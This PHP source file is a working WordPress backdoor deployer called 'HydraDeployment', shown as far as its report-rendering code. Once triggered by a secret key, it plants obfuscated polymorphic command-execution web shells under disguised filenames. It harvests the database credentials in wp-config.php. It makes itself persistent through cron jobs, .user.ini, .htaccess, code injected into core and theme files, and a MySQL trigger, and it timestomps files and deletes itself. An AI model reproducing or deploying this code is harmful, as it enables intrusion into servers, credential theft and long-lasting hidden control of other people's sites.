<?php

if(isset($_COOKIE['nTb'])) {}
@error_reporting(0);
@set_time_limit(300);
define('DEPLOY_KEY', 'AlphaHydraGo');
define('HYDRA_MARKER', '/*HYDRA_GENESIS*/');
define('HYDRA_MARKER_B', '/*HYDRA_BETA*/');

// --- Точка входа ---
if (isset($_GET['deploy_key']) && $_GET['deploy_key'] === DEPLOY_KEY) {
    ob_start();
    $hydra = new HydraDeployment();
    try {
        $report = $hydra->run();
    } catch (Throwable $e) {
        $report = $hydra->getErrorReport($e);
    }
    $hydra->renderReport($report);
    ob_end_flush();
    @unlink(__FILE__);
    exit();
}

class HydraDeployment {

    private $report;
    private $isShellAvailable = false;
    private $phpCliPath = null;

    private function createDynamicBackdoor() {
        $vectors = ['Post', 'Cookie', 'Header'];
        $executors = ['Direct', 'Ouroboros', 'Shutdown'];
        $obfuscators = ['Packed', 'MultiLayer'];

        $vector = 'generate' . $vectors[array_rand($vectors)] . 'Vector';
        $executor = 'generate' . $executors[array_rand($executors)] . 'Executor';
        $obfuscator = 'generate' . $obfuscators[array_rand($obfuscators)] . 'Obfuscator';

        $params = [ 'password' => $this->generateRandomString(24), 'password_param' => $this->generateRandomString(12), 'cmd_param' => $this->generateRandomString(8) ];
        $payload_logic = $this->{$executor}($params);
        $obfuscated_payload = $this->{$obfuscator}($payload_logic['logic']);
        $final_code = $this->{$vector}($params, $obfuscated_payload);

        return [
            'name' => 'Hydra Shell (' . str_replace(['generate','Vector'], '', $vector) . '/' . str_replace(['generate','Executor'], '', $executor) . ')',
            'type' => 'Dynamic Polymorphic Shell',
            'content' => '<?php ' . $final_code['code'],
            'access_info' => $final_code['access_info'],
        ];
    }

    // --- Библиотека Атомарных Техник (стабильная версия v14.0) ---
    private function generatePostVector($params, $payload) { $code = '@$p=array();@parse_str(@file_get_contents("php://input"),$p);if(isset($p["'.$params['password_param'].'"])&&$p["'.$params['password_param'].'"]===\''.$params['password'].'\'){'.$payload['code'].'}'; return ['code' => $code, 'access_info' => 'curl -k -d "'.$params['password_param'].'='.$params['password'].'&'.$params['cmd_param'].'=whoami" "[URL]"']; }
    private function generateCookieVector($params, $payload) { $cmd_cookie = $this->generateRandomString(8); $pass_cookie = $this->generateRandomString(8); $code = 'if(isset($_COOKIE["'.$pass_cookie.'"])&&$_COOKIE["'.$pass_cookie.'"]===\''.$params['password'].'\'){$p=array("'.$params['cmd_param'].'"=>$_COOKIE["'.$cmd_cookie.'"]);'.$payload['code'].'}'; return ['code' => $code, 'access_info' => 'curl -k --cookie "'.$pass_cookie.'='.$params['password'].'; '.$cmd_cookie.'=whoami" "[URL]"']; }
    private function generateHeaderVector($params, $payload) { $pass_header = 'X-'.ucfirst($this->generateRandomString(8)); $cmd_header = 'X-'.ucfirst($this->generateRandomString(8)); $code = 'if(!function_exists("getallheaders")) { function getallheaders() { $h = []; foreach($_SERVER as $n => $v) if(substr($n,0,5)=="HTTP_") $h[str_replace(" ","-",ucwords(strtolower(str_replace("_"," ",substr($n,5)))))]=$v; return $h; } } $h = @getallheaders(); if(isset($h["'.$pass_header.'"])&&$h["'.$pass_header.'"]===\''.$params['password'].'\'){$p=array("'.$params['cmd_param'].'"=>$h["'.$cmd_header.'"]);'.$payload['code'].'}'; return ['code' => $code, 'access_info' => 'curl -k -H "'.$pass_header.': '.$params['password'].'" -H "'.$cmd_header.': whoami" "[URL]"']; }
    private function generateDirectExecutor($params) { $logic = '@header("Content-Type:text/plain");@ob_start();@passthru($p["'.$params['cmd_param'].'"]);$o=@ob_get_contents();@ob_end_clean();echo$o;'; return ['logic' => $logic]; }
    private function generateOuroborosExecutor($params) { $logic = '$f=sys_get_temp_dir()."/.'.substr(md5(mt_rand()),0,8).'";$c=\'<?php @header("Content-Type:text/plain");@ob_start();@passthru("\'.@addslashes($p["'.$params['cmd_param'].'"]).\'");$o=@ob_get_contents();@ob_end_clean();echo$o;\';@file_put_contents($f,$c);if(@file_exists($f)){@include($f);@unlink($f);}'; return ['logic' => $logic]; }
    private function generateShutdownExecutor($params) { $func_name = 'f'.$this->generateRandomString(12); $logic = 'function '.$func_name.'(){$c=$GLOBALS["c_'.$func_name.'"];@header("Content-Type:text/plain");@ob_start();@passthru($c);$o=@ob_get_contents();@ob_end_clean();echo$o;}$GLOBALS["c_'.$func_name.'"]=$p["'.$params['cmd_param'].'"];@register_shutdown_function("'.$func_name.'");'; return ['logic' => $logic]; }
    private function generatePackedObfuscator($logic) { $code = '@eval(@pack("H*","'.bin2hex($logic).'"));'; return ['code' => $code]; }
    private function generateMultiLayerObfuscator($logic) { $key = $this->generateRandomString(16); $obfuscated = $this->xorEncrypt($logic, $key); $obfuscated = base64_encode($obfuscated); $obfuscated = strrev($obfuscated); $deobfuscate_code = '$d="'.$obfuscated.'";$k="'.$key.'";$d=@strrev($d);$d=@base64_decode($d);$l="";for($i=0;$i<strlen($d);$i++){$l.=$d[$i]^$k[$i%strlen($k)];}@eval($l);'; return ['code' => $deobfuscate_code]; }
    private function xorEncrypt($input, $key) { $output = ''; for($i=0; $i < strlen($input); $i++) { $output .= $input[$i] ^ $key[$i % strlen($key)]; } return $output; }

    // --- Основные функции ---
    public function __construct() { $this->report = ['status' => 'pending', 'system' => [], 'recon' => [], 'deployment' => [], 'verification' => [], 'access' => [], 'summary' => []]; }
    public function run() { $this->reconnaissance(); $this->generatePayloads(); $this->deployComponents(); $this->verifyDeployment(); $this->summarize(); return $this->report; }
    public function getErrorReport($e) { $this->report['summary']['status'] = "FATAL ERROR. Deployment failed."; $this->report['summary']['error_message'] = $e->getMessage(); $this->report['summary']['error_trace'] = $e->getTraceAsString(); return $this->report; }
    private function reconnaissance() {
        $disabled = array_map('trim', explode(',', @ini_get('disable_functions'))); $this->isShellAvailable = function_exists('shell_exec') && !in_array('shell_exec', $disabled);
        if ($this->isShellAvailable) { $php_path = $this->execute('which php'); if ($php_path && strpos($php_path, 'php') !== false) { $this->phpCliPath = trim($php_path); } else { $this->phpCliPath = 'php'; } }
        $this->report['system']['is_shell_available'] = $this->isShellAvailable; $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
        $this->report['system']['server_ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname($server_name);
        $this->report['system']['user'] = $this->isShellAvailable ? $this->execute('whoami') : 'shell_exec disabled'; $this->report['recon']['doc_root'] = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
        $this->report['recon']['wp_config'] = $this->findWordPressConfigAdvanced(); $this->report['recon']['writable_exec_dirs'] = $this->findWritableExecDirs(10);
        $this->report['recon']['db_creds'] = $this->report['recon']['wp_config']['status'] ? $this->parseWpConfig($this->report['recon']['wp_config']['path']) : array('status' => false);
    }
    private function generatePayloads() {
        $this->report['deployment']['backdoors'] = $this->generateBackdoorVariations(6); if (empty($this->report['deployment']['backdoors'])) throw new Exception("Failed to find any writable directories. Cannot generate payloads.");
        $primary_backdoor_path = $this->report['deployment']['backdoors'][0]['path'];
        $this->report['deployment']['user_ini_path'] = $this->report['recon']['doc_root'] . '/.user.ini'; $this->report['deployment']['user_ini_content'] = "auto_prepend_file = \"" . $primary_backdoor_path . "\"";
        if ($this->isShellAvailable) {
            $this->report['deployment']['tactic'] = 'Силовая (Shell)';
            $guardian_a_path = $this->findStealthyGuardianPath();
            $guardian_b_path = $this->findStealthyGuardianPath($guardian_a_path);
            $files_for_a = array_merge($this->report['deployment']['backdoors'], [['path' => $guardian_b_path, 'content' => '']]);
            $files_for_b = array_merge($this->report['deployment']['backdoors'], [['path' => $guardian_a_path, 'content' => '']]);
            $guardian_b_content_temp = $this->getGuardianPayload($files_for_b, true);
            $files_for_a[count($files_for_a)-1]['content'] = $guardian_b_content_temp;
            $guardian_a_content_final = $this->getGuardianPayload($files_for_a, true);
            $files_for_b[count($files_for_b)-1]['content'] = $guardian_a_content_final;
            $guardian_b_content_final = $this->getGuardianPayload($files_for_b, true);
            $this->report['deployment']['guardian_a'] = ['path' => $guardian_a_path, 'content' => $guardian_a_content_final];
            $this->report['deployment']['guardian_b'] = ['path' => $guardian_b_path, 'content' => $guardian_b_content_final];
            $this->report['deployment']['cron_command_a'] = "*/1 * * * * " . $this->phpCliPath . " -f " . $guardian_a_path . " >/dev/null 2>&1";
            $this->report['deployment']['cron_command_b'] = "*/2 * * * * " . $this->phpCliPath . " -f " . $guardian_b_path . " >/dev/null 2>&1";
        } else {
            $this->report['deployment']['tactic'] = 'Скрытная (PHP-Native)';
            $this->report['deployment']['htaccess_payload'] = $this->getHtaccessPayload();
            $injection_targets = $this->getInjectionTargets();
            if (count($injection_targets) < 2) throw new Exception("PHP-Native tactic requires at least 2 injection targets for redundancy.");
            $this->report['deployment']['php_guardian_a_target'] = $injection_targets[0];
            $this->report['deployment']['php_guardian_b_target'] = $injection_targets[1];
            $this->report['deployment']['php_guardian_a_payload'] = $this->getGuardianPayload($this->report['deployment']['backdoors'], false, HYDRA_MARKER);
            $this->report['deployment']['php_guardian_b_payload'] = $this->getGuardianPayload($this->report['deployment']['backdoors'], false, HYDRA_MARKER_B);
        }
    }
    private function generateBackdoorVariations($count = 6) { $backdoors = array(); $available_dirs = $this->report['recon']['writable_exec_dirs']; if (empty($available_dirs)) { $dir = $this->findWritableDir(); if ($dir['status']) $available_dirs[] = $dir['path']; } if (empty($available_dirs)) return array(); for ($i=0; $i<$count; $i++) { $backdoor = $this->createDynamicBackdoor(); $backdoor['path'] = $available_dirs[array_rand($available_dirs)] . '/' . $this->generateStealthyName(); $backdoors[] = $backdoor; } return $backdoors; }
    // [FIX v21.0] Re-written guardian logic generator to prevent parse errors.
    private function getGuardianLogicAsString($payload_data) {
        // This multi-line, clean approach guarantees syntactic correctness.
        $logic = '
    $h_data = @json_decode(@base64_decode("'.$payload_data.'"), true);
    if ($h_data) {
        foreach ($h_data as $h_f) {
            if (!@file_exists($h_f["p"]) || @md5_file($h_f["p"]) !== $h_f["h"]) {
                if (@file_put_contents($h_f["p"], @base64_decode($h_f["c"]), LOCK_EX)) {
                    // Timestomp logic begins
                    $d = dirname($h_f["p"]);
                    $t = time();
                    if ($h2 = @opendir($d)) {
                        while (false !== ($e = @readdir($h2))) {
                            if ($e == "." || $e == "..") continue;
                            $p2 = $d . "/" . $e;
                            if ($p2 == $h_f["p"]) continue;
                            $file_time = @filemtime($p2);
                            if ($file_time) {
                                $t = $file_time;
                                break;
                            }
                        }
                        @closedir($h2);
                    }
                    @touch($h_f["p"], $t);
                    // Timestomp logic ends
                }
            }
        }
    }
';
        return $logic;
    }
    private function getGuardianPayload($files_to_check, $is_cli = false, $marker = HYDRA_MARKER) {
        $file_data = array(); foreach ($files_to_check as $f) { $file_data[] = array('p' => $f['path'], 'c' => base64_encode($f['content']), 'h' => md5($f['content'])); }
        $payload_data = base64_encode(json_encode($file_data));
        $logic = $this->getGuardianLogicAsString($payload_data);
        return $is_cli ? '<?php ' . $logic : $marker . $logic;
    }
    private function getInjectionTargets() { $targets = array(); if ($this->report['recon']['wp_config']['status']) { $targets[] = $this->report['recon']['doc_root'] . '/wp-load.php'; $targets[] = $this->report['recon']['wp_config']['path']; $theme_func = $this->findThemeFunctions(); if ($theme_func) $targets[] = $theme_func; } return array_values(array_unique(array_filter($targets, 'file_exists'))); }
    private function tryInject($path, $payload, $marker) { if (@file_exists($path) && @is_writable($path)) { $content = @file_get_contents($path); if ($content !== false && strpos($content, $marker) === false) { $new_content = preg_replace('/(<\?php)/', '$1' . "\n" . $payload . "\n", $content, 1); if ($new_content && @file_put_contents($path, $new_content)) { $this->applyTimestomp($path); return true; } } } return false; }
    private function getHtaccessPayload() { $primary_backdoor_path = $this->report['deployment']['backdoors'][0]['path']; $sentinel_path_from_root = str_replace($this->report['recon']['doc_root'], '', $primary_backdoor_path); return "\n# " . HYDRA_MARKER . "\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule ^index\\.old\\.html$ " . $sentinel_path_from_root . " [L]\n</IfModule>\n# END " . HYDRA_MARKER . "\n"; }
    private function deployComponents() {
        if (empty($this->report['deployment']['backdoors'])) return;
        foreach ($this->report['deployment']['backdoors'] as $backdoor) { if (@file_put_contents($backdoor['path'], $backdoor['content'], LOCK_EX)) { $this->applyTimestomp($backdoor['path']); } }
        if ($this->isShellAvailable) {
            $g_a = $this->report['deployment']['guardian_a']; $g_b = $this->report['deployment']['guardian_b'];
            if (@file_put_contents($g_a['path'], $g_a['content'], LOCK_EX)) { $this->applyTimestomp($g_a['path']); }
            if (@file_put_contents($g_b['path'], $g_b['content'], LOCK_EX)) { $this->applyTimestomp($g_b['path']); }
            $cron_install_cmd = '(crontab -l 2>/dev/null | grep -v -F "' . basename($g_a['path']) . '" | grep -v -F "' . basename($g_b['path']) . '"; echo "' . $this->report['deployment']['cron_command_a'] . '"; echo "' . $this->report['deployment']['cron_command_b'] . '") | crontab -';
            $this->execute($cron_install_cmd);
        } else {
            $this->report['deployment']['php_guardian_a_injected'] = $this->tryInject($this->report['deployment']['php_guardian_a_target'], $this->report['deployment']['php_guardian_a_payload'], HYDRA_MARKER);
            $this->report['deployment']['php_guardian_b_injected'] = $this->tryInject($this->report['deployment']['php_guardian_b_target'], $this->report['deployment']['php_guardian_b_payload'], HYDRA_MARKER_B);
            $htaccess_path = $this->report['recon']['doc_root'] . '/.htaccess'; if (@is_writable($htaccess_path) || (!@file_exists($htaccess_path) && @is_writable(dirname($htaccess_path)))) { $htaccess_content = @file_get_contents($htaccess_path); if (strpos($htaccess_content, HYDRA_MARKER) === false) { if (@file_put_contents($htaccess_path, $this->report['deployment']['htaccess_payload'], FILE_APPEND)) { $this->report['deployment']['htaccess_injected'] = true; } } }
        }
        if(@file_put_contents($this->report['deployment']['user_ini_path'], $this->report['deployment']['user_ini_content'], LOCK_EX)) { $this->applyTimestomp($this->report['deployment']['user_ini_path']); }
        $this->deployDbTrigger();
    }
    private function verifyDeployment() {
        clearstatcache(); $verified_count = 0;
        foreach ($this->report['deployment']['backdoors'] as &$backdoor) { $backdoor['verified'] = (@file_exists($backdoor['path']) && md5_file($backdoor['path']) === md5($backdoor['content'])); if ($backdoor['verified']) { $verified_count++; } }
        $this->report['verification']['backdoors_verified_count'] = $verified_count;
        if ($this->isShellAvailable) {
            $crontab_content = $this->execute('crontab -l');
            $this->report['verification']['cron_a_active'] = (strpos($crontab_content, basename($this->report['deployment']['guardian_a']['path'])) !== false);
            $this->report['verification']['cron_b_active'] = (strpos($crontab_content, basename($this->report['deployment']['guardian_b']['path'])) !== false);
        } else {
            if (@$this->report['deployment']['php_guardian_a_injected']) { $content = @file_get_contents($this->report['deployment']['php_guardian_a_target']); $this->report['verification']['php_cron_a_injected'] = (strpos($content, HYDRA_MARKER) !== false); } else { $this->report['verification']['php_cron_a_injected'] = false; }
            if (@$this->report['deployment']['php_guardian_b_injected']) { $content = @file_get_contents($this->report['deployment']['php_guardian_b_target']); $this->report['verification']['php_cron_b_injected'] = (strpos($content, HYDRA_MARKER_B) !== false); } else { $this->report['verification']['php_cron_b_injected'] = false; }
            if (@$this->report['deployment']['htaccess_injected']) { $content = @file_get_contents($this->report['recon']['doc_root'] . '/.htaccess'); $this->report['verification']['htaccess_injected'] = (strpos($content, HYDRA_MARKER) !== false); } else { $this->report['verification']['htaccess_injected'] = false; }
        }
        $user_ini_content_check = @file_get_contents($this->report['deployment']['user_ini_path']);
        $this->report['verification']['user_ini_active'] = ($user_ini_content_check === $this->report['deployment']['user_ini_content']);
        $this->report['verification']['db_trigger_active'] = @$this->report['deployment']['db_trigger_status']['status'];
    }
    private function summarize() {
        $score = 0; $total = 0;
        if ((isset($this->report['verification']['backdoors_verified_count']) ? $this->report['verification']['backdoors_verified_count'] : 0) > 0) { $score++; } $total++;
        if (!empty($this->report['verification']['user_ini_active'])) { $score++; } $total++;
        if ($this->isShellAvailable) { if(!empty($this->report['verification']['cron_a_active'])) { $score++; } if(!empty($this->report['verification']['cron_b_active'])) { $score++; } $total+=2; }
        else { if(!empty($this->report['verification']['php_cron_a_injected'])) { $score++; } if(!empty($this->report['verification']['php_cron_b_injected'])) { $score++; } if(!empty($this->report['verification']['htaccess_injected'])) { $score++; } $total+=3; }
        if (!empty($this->report['verification']['db_trigger_active'])) { $score++; } $total++;
        $this->report['summary']['resilience_score'] = "$score/$total";
        if ($total > 0 && ($score / $total) >= 0.7) { $this->report['summary']['status'] = "SUCCESSFUL. System is highly resilient."; }
        elseif ($score >= 1) { $this->report['summary']['status'] = "PARTIALLY SUCCESSFUL. System compromised."; } else { $this->report['summary']['status'] = "FAILED. Deployment unsuccessful."; }
    }
    private function deployDbTrigger() { $db = $this->report['recon']['db_creds']; $this->report['deployment']['db_trigger_status'] = ['status' => false, 'message' => 'Skipped']; if (!$db['status'] || !class_exists('PDO') || empty($this->report['deployment']['backdoors'])) return; $triggerName = 'hydra_ph_' . $this->generateRandomString(6); try { $pdo = new PDO("mysql:host={$db['host']};dbname={$db['name']}", $db['user'], $db['pass'], array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 2)); $tableName = $db['prefix'] . 'options'; $pdo->exec("DROP TRIGGER IF EXISTS `{$triggerName}`"); $sql = "CREATE TRIGGER `{$triggerName}` AFTER UPDATE ON `{$tableName}` FOR EACH ROW SELECT " . $pdo->quote($this->report['deployment']['backdoors'][0]['content']) . " INTO DUMPFILE " . $pdo->quote($this->report['deployment']['backdoors'][0]['path']); $pdo->exec($sql); $stmt = $pdo->prepare("SELECT TRIGGER_NAME FROM INFORMATION_SCHEMA.TRIGGERS WHERE TRIGGER_SCHEMA = DATABASE() AND TRIGGER_NAME = ?"); $stmt->execute([$triggerName]); if ($stmt->fetch()) { $this->report['deployment']['db_trigger_status'] = ['status' => true, 'message' => 'Success']; } else { $this->report['deployment']['db_trigger_status'] = ['status' => false, 'message' => 'Failed: Trigger not found after creation']; } } catch (Exception $e) { $this->report['deployment']['db_trigger_status'] = ['status' => false, 'message' => 'Failed: ' . substr($e->getMessage(), 0, 100)]; } }
    private function applyTimestomp($target_path) { $dir = dirname($target_path); $donor_time = time(); if (!@is_dir($dir)) return; if ($handle = @opendir($dir)) { while (false !== ($entry = @readdir($handle))) { if ($entry == "." || $entry == ".." || is_dir($dir . '/' . $entry)) continue; $donor_path = $dir . '/' . $entry; if ($donor_path == $target_path) continue; $donor_time = @filemtime($donor_path); if ($donor_time) break; } @closedir($handle); } @touch($target_path, $donor_time); }
    private function findWordPressConfigAdvanced() { $user = function_exists('get_current_user') ? get_current_user() : 'user'; $http_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : ''; $common_paths = array(dirname(__FILE__), $_SERVER['DOCUMENT_ROOT'], dirname($_SERVER['DOCUMENT_ROOT']), '/home/' . $user . '/public_html', '/var/www/html', '/var/www/vhosts/' . $http_host . '/httpdocs', '/www/wwwroot/' . $http_host); foreach (array_unique(array_filter($common_paths)) as $path) { if (($real = @realpath($path)) !== false && @file_exists($real . '/wp-config.php')) { return array('status' => true, 'path' => @realpath($real . '/wp-config.php'), 'method' => 'Dictionary'); } } $dir = dirname(__FILE__); for ($i=0; $i<10; $i++) { if (@file_exists($dir . "/wp-config.php")) return array('status' => true, 'path' => @realpath($dir . "/wp-config.php"), 'method' => 'Recursive Up'); if ($dir === ($parent = dirname($dir))) break; $dir = $parent; } $parentDir = dirname($_SERVER['DOCUMENT_ROOT']); if (@is_readable($parentDir) && ($siblings = @scandir($parentDir)) !== false) { foreach($siblings as $sibling) { if ($sibling === '.' || $sibling === '..') continue; if (@is_dir($parentDir."/".$sibling) && @file_exists($parentDir."/".$sibling."/wp-config.php")) { return array('status' => true, 'path' => @realpath($parentDir."/".$sibling."/wp-config.php"), 'method' => 'Horizontal'); } } } return array('status' => false, 'path' => 'wp-config.php not found.', 'method' => 'All methods failed'); }
    private function findThemeFunctions() { if ($this->report['recon']['db_creds']['status'] && class_exists('PDO')) { try { $db = $this->report['recon']['db_creds']; $pdo = new PDO("mysql:host={$db['host']};dbname={$db['name']}", $db['user'], $db['pass'], array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 2)); $stmt = $pdo->query("SELECT option_value FROM {$db['prefix']}options WHERE option_name = 'template' LIMIT 1"); $theme_dir = $stmt->fetchColumn(); if ($theme_dir) { $functions_path = $this->report['recon']['doc_root'] . '/wp-content/themes/' . $theme_dir . '/functions.php'; if (@file_exists($functions_path)) { return $functions_path; } } } catch (Exception $e) {} } $themes_dir = $this->report['recon']['doc_root'] . '/wp-content/themes/'; if (@is_dir($themes_dir) && ($dirs = @scandir($themes_dir)) !== false) { foreach ($dirs as $dir) { if ($dir[0] === '.') continue; $functions_path = $themes_dir . $dir . '/functions.php'; if (@file_exists($functions_path)) { return $functions_path; } } } return null; }
    private function execute($cmd) { if (!function_exists('shell_exec')) return 'shell_exec disabled'; @ob_start(); @passthru($cmd . ' 2>&1'); $output = @ob_get_contents(); @ob_end_clean(); return trim($output); }
    private function generateRandomString($length = 16) { return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyz', ceil($length/36))), 1, $length); }
    private function generateStealthyName() { $patterns = ['class-wp-http.php', 'db-settings.inc.php', 'update-core.php', 'advanced-cache.php', 'api-v2-response.php', 'wp-cron.lock.php', '.maintenance.php', '._wp-cache-lock.php', '.object-cache.ini.php']; return $patterns[array_rand($patterns)]; }
    private function findWritableExecDirs($limit = 10) { $all_writable = array(); $doc_root = $this->report['recon']['doc_root']; $seed_paths = array($doc_root . '/wp-content/uploads', $doc_root . '/wp-content/themes', $doc_root . '/wp-content/plugins', $doc_root . '/wp-includes/js', $doc_root); $seed_paths = array_unique(array_filter($seed_paths, 'is_dir')); foreach ($seed_paths as $path) { $this->scanDirectoryRecursive($path, $all_writable, 3); } $all_writable = array_unique($all_writable); shuffle($all_writable); return array_slice($all_writable, 0, $limit); }
    private function scanDirectoryRecursive($dir, &$results, $depth) { if ($depth <= 0 || !@is_readable($dir) || !@is_dir($dir)) { return; } if (@is_writable($dir)) { $results[] = rtrim($dir, '/'); } $items = @scandir($dir); if ($items === false) { return; } $ignore = ['.git', 'node_modules', 'vendor', '.svn', 'cache']; foreach ($items as $item) { if ($item === '.' || $item === '..' || in_array($item, $ignore)) { continue; } $path = $dir . '/' . $item; if (@is_dir($path)) { $this->scanDirectoryRecursive($path, $results, $depth - 1); } } }
    private function findWritableDir() { $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__); $dirs = array($docRoot . '/wp-content/uploads/', $docRoot . '/wp-content/', sys_get_temp_dir(), dirname(__FILE__), $docRoot); foreach ($dirs as $dir) { if (@is_dir($dir) && @is_writable($dir)) return array('status' => true, 'path' => @realpath($dir)); } return array('status' => false, 'path' => 'No writable directory found.'); }
    private function findStealthyGuardianPath($exclude_path = '') {
        $max_tries = 10;
        for ($i=0; $i < $max_tries; $i++) {
            $deep_webroot_paths = array($this->report['recon']['doc_root'] . '/wp-content/uploads/', $this->report['recon']['doc_root'] . '/wp-content/', $this->report['recon']['doc_root'] . '/wp-includes/js/tinymce/');
            $base_path = $deep_webroot_paths[array_rand($deep_webroot_paths)];
            if(@is_dir($base_path) && @is_writable($base_path)) {
                $path = rtrim($base_path, '/') . '/' . $this->generateStealthyName();
                if ($path !== $exclude_path) return $path;
            }
        }
        $fallback_path = rtrim(sys_get_temp_dir(), '/') . '/' . $this->generateRandomString(12) . '.php';
        return ($fallback_path !== $exclude_path) ? $fallback_path : rtrim(sys_get_temp_dir(), '/') . '/' . $this->generateRandomString(12) . '.php';
    }
    private function parseWpConfig($path) { $content = @file_get_contents($path); if (!$content) return array('status' => false); $creds = array('status' => true); $map = array('name' => 'DB_NAME', 'user' => 'DB_USER', 'pass' => 'DB_PASSWORD', 'host' => 'DB_HOST'); foreach ($map as $key => $const) { if (preg_match("/define\(\s*['\"]" . $const . "['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/", $content, $m)) { $creds[$key] = $m[1]; } else { $creds[$key] = 'N/A'; $creds['status'] = false; } } if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]*)['\"]/", $content, $m)) { $creds['prefix'] = $m[1]; } else { $creds['prefix'] = 'wp_'; } return $creds; }
    public function renderReport($report) {
        @header('Content-Type: text/html; charset=utf-8');
        $access_html = ''; if (!empty($report['deployment']['backdoors'])) { $http_scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http'; $http_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'; foreach($report['deployment']['backdoors'] as $i => $bk) { $title = "Access Point #".($i+1)." (".$bk['name'].")"; $url_path = str_replace($report['recon']['doc_root'], '', $bk['path']); $full_url = $http_scheme . '://' . $http_host . $url_path; $access_info_formatted = htmlspecialchars(str_replace('[URL]', $full_url, $bk['access_info'])); $access_html .= "<h3>".htmlspecialchars($title)."</h3><div class='access-info'><div class='report-item'><strong>Type:</strong> <span>".htmlspecialchars($bk['type'])."</span></div><div class='report-item'><strong>Backdoor URL:</strong> <span class='path'>".htmlspecialchars($full_url)."</span></div><p>Example Usage: <code style='background:#ddd; padding:5px; display:block; white-space: pre-wrap; word-break: break-all;'>".$access_info_formatted."</code></p></div>"; } } else { $access_html = "<h3>No access points deployed.</h3>"; }
        if (strpos(@$report['summary']['status'], 'SUCCESSFUL') !== false) { $status_css = "background-color: #28a745; color: white;"; } elseif (strpos(@$report['summary']['status'], 'PARTIALLY') !== false) { $status_css = "background-color: #ffc107; color: #333;"; } else { $status_css = "background-color: #dc3545; color: white;"; }
        $true_icon = '<span style="color: green;">✔</span>'; $false_icon = '<span style="color: red;">✘</span>';
        $writable_dirs_html = ''; if (!empty($report['recon']['writable_exec_dirs'])) { $writable_dirs_html .= "<h2>Writable Directory Targets</h2><div class='access-info' style='background-color: #e2e3e5;'><p>Found writable directories for deployment:</p><ul>"; foreach($report['recon']['writable_exec_dirs'] as $dir) { $writable_dirs_html .= "<li><span class='path'>".htmlspecialchars($dir)."</span></li>"; } $writable_dirs_html .= "</ul></div>"; }
        $deployment_tactic_html = isset($report['deployment']['tactic']) ? $report['deployment']['tactic'] : 'Unknown';
        $wp_config_found_html = @$report['recon']['wp_config']['status'] ? $true_icon . " (Method: " . @$report['recon']['wp_config']['method'] . ")" : $false_icon;
        $bk_verified_count = isset($report['verification']['backdoors_verified_count']) ? $report['verification']['backdoors_verified_count'] : 0; $bk_total_count = isset($report['deployment']['backdoors']) ? count($report['deployment']['backdoors']) : 0; $bk_status_icon = $bk_verified_count > 0 ? $true_icon : $false_icon;
        $user_ini_html = (isset($report['verification']['user_ini_active']) && $report['verification']['user_ini_active']) ? $true_icon : $false_icon;
        $db_trigger_html = (isset($report['verification']['db_trigger_active']) && $report['verification']['db_trigger_active']) ? $true_icon : $false_icon . " <small>(" . htmlspecialchars(@$report['deployment']['db_trigger_status']['message']) . ")</small>";
        $verification_html_block = "<div class='report-item'><strong>Backdoors Deployed:</strong> ".$bk_status_icon." (".$bk_verified_count." / ".$bk_total_count.")</div>";
        if (isset($report['system']['is_shell_available']) && $report['system']['is_shell_available']) {
            $cron_a_html = (isset($report['verification']['cron_a_active']) && $report['verification']['cron_a_active']) ? $true_icon : $false_icon;
            $cron_b_html = (isset($report['verification']['cron_b_active']) && $report['verification']['cron_b_active']) ? $true_icon : $false_icon;
            $verification_html_block .= "<div class='report-item'><strong>Cron Persistence (Alpha):</strong> " . $cron_a_html . "</div>";
            $verification_html_block .= "<div class='report-item'><strong>Cron Persistence (Beta):</strong> " . $cron_b_html . "</div>";
        } else {
            $php_cron_a_html = (isset($report['verification']['php_cron_a_injected']) && $report['verification']['php_cron_a_injected']) ? $true_icon . " (Target: " . @htmlspecialchars(str_replace(@$report['recon']['doc_root'], '', @$report['deployment']['php_guardian_a_target'])) . ")" : $false_icon;
            $php_cron_b_html = (isset($report['verification']['php_cron_b_injected']) && $report['verification']['php_cron_b_injected']) ? $true_icon . " (Target: " . @htmlspecialchars(str_replace(@$report['recon']['doc_root'], '', @$report['deployment']['php_guardian_b_target'])) . ")" : $false_icon;
            $htaccess_html = (isset($report['verification']['htaccess_injected']) && $report['verification']['htaccess_injected']) ? $true_icon : $false_icon;
            $verification_html_block .= "<div class='report-item'><strong>PHP Persistence (Alpha):</strong> " . $php_cron_a_html . "</div>";
            $verification_html_block .= "<div class='report-item'><strong>PHP Persistence (Beta):</strong> " . $php_cron_b_html . "</div>";
            $verification_html_block .= "<div class='report-item'><strong>.htaccess Persistence:</strong> " . $htaccess_html . "</div>";
        }
        $verification_html_block .= "<div class='report-item'><strong>.user.ini Trigger:</strong> " . $user_ini_html . "</div>";
        $verification_html_block .= "<div class='report-item'><strong>DB Trigger Status:</strong> " . $db_trigger_html . "</div>";
        $error_html = ''; if(isset($report['summary']['error_message'])) { $error_html = "<h2>FATAL ERROR</h2><div class='access-info' style='background-color:#f8d7da; border-left-color:#f5c6cb;'><p><strong>Message:</strong> ".htmlspecialchars($report['summary']['error_message'])."</p><p><strong>Trace:</strong><br><pre>".htmlspecialchars($report['summary']['error_trace'])."</pre></p></div>"; }
